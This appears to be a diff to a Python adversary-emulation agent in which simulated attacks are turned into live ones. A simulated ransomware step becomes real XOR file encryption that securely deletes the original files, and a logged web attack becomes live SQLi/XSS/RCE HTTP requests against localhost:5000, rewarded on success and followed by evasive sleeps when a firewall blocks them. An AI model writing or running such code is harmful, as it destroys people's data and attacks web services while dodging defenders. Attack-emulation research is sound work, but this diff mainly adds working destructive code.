@@ -11,6 +11,8 @@ import random
 import utils
 import config
 import payload_factory
+import urllib.request
+import urllib.error
 
 # --- SYSTEM CONFIGURATION ---
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -150,13 +152,23 @@ def engage_offense():
                 impact = 0
 
             elif action == "T1486_ENCRYPT":
-                # Ransomware Simulation: Encrypt a file (rename to .enc)
+                # REAL Ransomware: XOR Encryption
                 try:
                     files = [f.path for f in os.scandir(TARGET_DIR) if f.is_file() and not f.name.endswith('.enc')]
                     if files:
                         target = _choice(files)
+
+                        # Read - Encrypt - Write
+                        key = 0xAA # Simple XOR key
+                        with open(target, 'rb') as f: data = bytearray(f.read())
+                        for i in range(len(data)): data[i] ^= key
+
                         new_name = target + ".enc"
-                        os.rename(target, new_name)
+                        with open(new_name, 'wb') as f: f.write(data)
+
+                        utils.secure_delete(target) # Delete original
+
+                        logger.info(f"RANSOMWARE: Encrypted {os.path.basename(target)}")
                         impact = 8
                 except: pass
 
@@ -172,41 +184,28 @@ def engage_offense():
                 except: pass
 
             elif action == "T1190_WEB_EXPLOIT":
-                # Advanced Web Attack with Feedback Loop
-                ip = f"192.168.1.{random.randint(10, 200)}"
-                req_id = random.randint(10000, 99999)
-                fname = f"{TARGET_DIR}/http_req_{ip}_{req_id}.log"
-
-                # Choose Attack Type
+                # LIVE FIRE: Real HTTP Attack against localhost:5000
                 atype = _choice(["SQLi", "XSS", "RCE"])
                 payload = payload_gen.generate(atype)
 
-                # Check previous success/fail (Learning from Feedback)
-                # If we were blocked recently, we might get negative reward, but here we just try hard.
+                # Encode payload
+                encoded = urllib.parse.quote(payload)
+                url = f"http://127.0.0.1:5000/?q={encoded}"
 
                 try:
-                    with open(fname, 'w') as f:
-                        f.write(f"GET /?q={payload} HTTP/1.1\nHost: target")
-                    impact = 6
-                    last_web_attack_id = req_id
-                except: pass
-
-            # Check for Feedback (Did we succeed?)
-            if last_web_attack_id:
-                resp_200 = os.path.join(TARGET_DIR, f"http_resp_{last_web_attack_id}_200.log")
-                resp_403 = os.path.join(TARGET_DIR, f"http_resp_{last_web_attack_id}_403.log")
-
-                if os.path.exists(resp_200):
-                    reward += 10 # Massive reward for bypassing defenses
-                    logger.info(f"ATTACK SUCCESS: {last_web_attack_id} bypassed defenses!")
-                    utils.secure_delete(resp_200)
-                    last_web_attack_id = None
-                elif os.path.exists(resp_403):
-                    reward -= 5 # Penalty for getting blocked
-                    logger.info(f"ATTACK BLOCKED: {last_web_attack_id} failed. Evasively sleeping...")
-                    utils.secure_delete(resp_403)
-                    last_web_attack_id = None
-                    utils.adaptive_sleep(2.0, 0.0) # Wait out the SOC correlation window
+                    req = urllib.request.Request(url)
+                    with urllib.request.urlopen(req, timeout=1) as response:
+                        if response.status == 200:
+                            reward += 10
+                            logger.info(f"ATTACK SUCCESS: Payload '{payload[:20]}...' executed (200 OK)")
+                            impact = 8
+                except urllib.error.HTTPError as e:
+                    if e.code == 403:
+                        reward -= 5
+                        logger.warning("ATTACK BLOCKED: WAF/SOC intercepted request (403 Forbidden)")
+                        utils.adaptive_sleep(2.0, 0.0) # Evasion
+                except Exception as e:
+                    pass
 
             elif action == "T1003_CREDENTIAL_DUMPING":
                 # Simulated Credential Access
